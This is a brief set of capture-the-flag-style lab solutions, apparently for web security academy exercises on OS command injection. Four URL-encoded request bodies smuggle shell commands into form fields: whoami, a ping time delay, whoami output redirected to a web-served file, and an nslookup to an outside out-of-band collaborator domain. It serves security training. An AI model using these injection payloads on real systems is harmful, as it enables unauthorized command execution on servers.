
## Lab: OS command injection, simple case

```
productId=1&storeId=%26+whoami
```

## Lab: Blind OS command injection with time delays

```
csrf=KbKhE2gKC6pgIrL3kxuWA3P7zCsrMsGd&name=test&email=test%40test.com+%26+ping+-c+10+127.0.0.1+%26&subject=test&message=test
```

## Lab: Blind OS command injection with output redirection

```
csrf=tUsjagWwkIkEsI3S0nQEXyMB4wUcBXH7&name=test&email=test%40tees.com+%26+whoami+>+/var/www/images/andres.txt+%26&subject=test&message=tet
```

## Lab: Blind OS command injection with out-of-band interaction

```
csrf=MPTSzs0Q0DjlZpbOt4RTogOERcwiRgSD&name=test&email=test@test.com+%26+nslookup+00ys0c4te2dklhktk6iprl0i2982wukj.oastify.com+%26&subject=test&message=test
```

